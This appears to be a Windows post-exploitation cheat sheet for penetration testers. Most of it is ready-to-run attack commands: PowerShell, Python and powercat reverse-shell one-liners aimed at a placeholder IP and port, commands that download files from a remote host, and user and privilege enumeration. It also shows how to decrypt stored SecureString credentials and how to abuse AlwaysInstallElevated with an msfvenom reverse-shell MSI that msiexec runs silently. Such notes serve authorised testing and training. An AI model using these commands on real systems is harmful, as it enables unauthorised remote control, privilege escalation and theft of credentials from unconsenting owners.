## getting a reverse shell:-
powershell -c "$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" (via powershell)<br />
or<br />
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' (via python) 
or<br />
powercat -c "IP" -p PORT -e cmd.exe (via powercat)<br />
or<br />
simply use netcat
## first move to a powershell:-
powershell.exe

## then the obvious:-
whoami<br />
echo %username% (if whoami doesnt work) ONLY FOR CMD NOT FOR POWERSHELL<br />
$ENV:USERNAME (if whoami doesnt work) ONLY FOR POWERSHELL NOT FOR CMD<br />
whoami /priv<br />
net user<br />
net localgroup Administrators<br />
Get-ExecutionPolicy<br />
powershell.exe -ep bypass (to set execution policy to bypass)<br />
Get-Host | Select-Object Version (to check the whole version of powershell)<br />
$PSVersionTable.PSVersion.Major (to check the version of powershell)


## About the system and proccess running:-
systeminfo<br />
tasklist<br />
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) (to check if you r admin or not)<br />
(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Lanmanserver\Parameters" -Name SMB1 -ErrorAction SilentlyContinue | Select-Object "SMB1") (to check for smb version 1)<br />

## Locate files in the whole drive
dir filename.extension /s (do it from C:\ folder)(supports regex)
dir /a /q (linux like ls -la, gives time modified as well as file owner)

## Unhide directories and files
* attrib -h -r -s /s /d C:\*.* (The C drive can be changed to any drive of your choice)
* GCI alias Get-ChildItem
    1. -Recurse       - It digs deep into the child dir.           
    2. -Force or -FO  - It shows the hidden dir too. 
    #### usage example 
        gci c:/ -recurse -force 
<br />

## To Download somthing from the internet or intranet:-
powershell.exe -command (New-Object System.Net.Webclient).DownloadFile("http://ip address/domain:port/file","download location's full path\programname.extension")<br />
powershell Invoke-Webrequest -OutFile 'Dstn path.Extension' -Uri http://ip address/domain:port/file

**Note**: 
    curl too works in powershell, except for windows-IoT and similar minimal installations <br />
#### usage example:
    curl http://<IP>:<PORT>/file_name > Output_filename     

## Decrypting Powershell SecureString (ONLY WORKS WHEN YOU ARE THE OWNER OF THE XML FILE)
### If you have a xml object file

$credential = Import-CliXml -Path  PathToXml\MyCredential.xml <br />
$credential.GetNetworkCredential().Password <br />

### If you have a single string

$secretStuff = Get-Content  -Path secretstuff.txt | ConvertTo-SecureString <br />
[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR((($secretStuff))))

## Checking and exploiting AlwaysInstallElevated Permission

To check if this permission is enabled or not

1. reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
2. reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

If both of these come 0x1 then that means the permissions is allowed.
If it is allowed then we can install any .msi file with system privelages so now we just need to make a payload from msfvenom like this "msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=2345 --encoder x64/xor --iterations 9 --format msi --out test.msi" and put it in the target box and simply execute it by not trigger the uac and any gui with this "msiexec /quiet /qn /i test.msi" and u get a shell on your listener

## Checking any remaing sticky keys

Sometimes users do put stuff in sticky keys which is stored in C:\Users\USER\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
